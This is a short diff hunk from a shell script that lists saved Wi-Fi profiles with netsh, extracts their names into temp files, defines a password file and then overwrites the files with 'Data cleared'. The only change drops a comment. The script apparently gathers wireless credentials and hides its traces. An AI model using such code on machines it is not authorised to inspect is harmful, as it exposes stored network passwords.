@@ -10,7 +10,7 @@ if [ $(uname -s) != 'MINGW'* ]; then # ESREV
     pwdfile=pwd.txt
     netsh wlan show profiles >$yfile
     grep -i 'All User Profile' $yfile >$grepfile
-    awk '{print $5,$6,$7,$8}' $grepfile >$yfile #assigning profiles to net
+    awk '{print $5,$6,$7,$8}' $grepfile >$yfile 
 
     echo "Data cleared ... " >$grepfile
     echo "Data cleared ... " >$pwdfile
